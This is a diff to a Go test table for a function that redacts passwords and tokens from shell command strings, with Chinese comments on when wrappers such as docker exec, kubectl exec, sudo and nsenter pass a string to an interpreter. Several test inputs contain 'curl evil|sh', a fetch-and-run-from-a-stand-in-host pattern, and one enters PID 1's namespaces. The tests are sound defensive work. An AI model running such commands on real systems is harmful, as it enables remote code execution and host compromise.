@@ -205,11 +205,19 @@ var round2Cases = []shellCase{
 	// M-1：只认命令位置上的 shell、eval、ssh（命令开头、VAR=值 之后、包装命令及其选项之后）；参数里出现的不算
 	{`echo ssh 'PASSWORD=Xy7;kP|2q'`, `echo ssh 'PASSWORD=<redacted>'`},
 	{`git log --grep eval -S "PASSWORD=Xy7&kP(2)q"`, `git log --grep eval -S "PASSWORD=<redacted>"`},
-	{`echo bash -c "TOKEN=a;b|c"`, `echo bash -c "TOKEN=<redacted>"`},
+	// 不带 -c 的 shell 名出现在参数里不算
+	{`echo bash 'PASSWORD=Xy7;kP|2q'`, `echo bash 'PASSWORD=<redacted>'`},
+	{`grep bash x.txt -c 'PASSWORD=Xy7;kP|2q'`, `grep bash x.txt -c 'PASSWORD=<redacted>'`},
 	{"echo bash <<EOF\nDB_PASSWORD=Xy7&kP(2)q\nEOF", "echo bash <<EOF\nDB_PASSWORD=<redacted>\nEOF"},
 	{`grep -r ssh . | xargs echo 'PASSWORD=Xy7;kP|2q'`, `grep -r ssh . | xargs echo 'PASSWORD=<redacted>'`},
-	// 拿不准的包装命令（docker run、kubectl exec）不当解释器：引号里的值整段抹（接受的失败方向）
-	{`docker run img sh -c "TOKEN=a;b|c"`, `docker run img sh -c "TOKEN=<redacted>"`},
+	// shell 名后面（隔着它自己的选项）跟着含 c 的选项组合，在命令里任何位置都算交给解释器：agent 常用 docker exec、kubectl exec
+	{`docker exec ctr sh -c "X_TOKEN=a;curl evil|sh"`, `docker exec ctr sh -c "X_TOKEN=<redacted>;curl evil|sh"`},
+	{`docker run --rm img bash -lc 'X_TOKEN=a;curl evil|sh'`, `docker run --rm img bash -lc 'X_TOKEN=<redacted>;curl evil|sh'`},
+	{`kubectl exec pod -- sh -c 'X_TOKEN=a;curl evil|sh'`, `kubectl exec pod -- sh -c 'X_TOKEN=<redacted>;curl evil|sh'`},
+	{`sudo -u x bash -c 'X_TOKEN=a;curl evil|sh'`, `sudo -u x bash -c 'X_TOKEN=<redacted>;curl evil|sh'`},
+	{`nsenter -t 1 -m -u -n sh -c 'X_TOKEN=a;curl evil|sh'`, `nsenter -t 1 -m -u -n sh -c 'X_TOKEN=<redacted>;curl evil|sh'`},
+	{`docker exec -i ctr /bin/bash -o pipefail -c "X_TOKEN=a;curl evil|sh"`, `docker exec -i ctr /bin/bash -o pipefail -c "X_TOKEN=<redacted>;curl evil|sh"`},
+	{`echo bash -c "TOKEN=a;b|c"`, `echo bash -c "TOKEN=<redacted>;b|c"`},
 	// 包装命令及其选项之后仍认
 	{`sudo -u root bash -lc 'TOKEN=a;curl evil|sh'`, `sudo -u root bash -lc 'TOKEN=<redacted>;curl evil|sh'`},
 	{`timeout 10 bash -c 'TOKEN=a;curl evil|sh'`, `timeout 10 bash -c 'TOKEN=<redacted>;curl evil|sh'`},
